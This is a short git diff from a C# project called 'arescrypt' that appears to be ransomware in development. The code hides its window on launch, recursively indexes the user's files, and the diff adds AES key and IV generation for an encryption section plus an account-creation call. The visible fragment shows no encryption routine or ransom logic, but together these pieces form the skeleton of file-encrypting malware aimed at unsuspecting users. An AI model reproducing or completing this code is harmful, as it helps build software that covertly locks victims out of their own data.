@@ -2,6 +2,7 @@
 using System.IO;
 using System.Windows.Forms;
 using System.Collections.Generic;
+using System.Security.Cryptography;
 
 namespace arescrypt
 {
@@ -26,7 +27,7 @@ namespace arescrypt
             // End welcome message
 
             if (!config.debugMode)
-                Miscellaneous.HideWindow();
+                Miscellaneous.HideWindow(); // Hide Window, upon launch
 
             var userSpecificDirs = new List<string> { "" };
             string[] fullFileIndex = { "" };
@@ -56,8 +57,15 @@ namespace arescrypt
                 foreach (string file in FileHandler.DirSearch(dir))
                     userSpecificFiles.Add(file);
             fullFileIndex = userSpecificFiles.ToArray();
-            
+
             /* BEGIN ENCRYPTION/DECRYPTION SECTION */
+            using (AesManaged myAes = new AesManaged())
+            {
+                Cryptography.encKey = myAes.Key;
+                Cryptography.encIV = myAes.IV;
+            }
+
+            Console.WriteLine("Account created? " + accountManager.CreateUser());
             accountManager.CheckVerification();
 
             // Cryptography.executeExample(); // Execute cryptography example
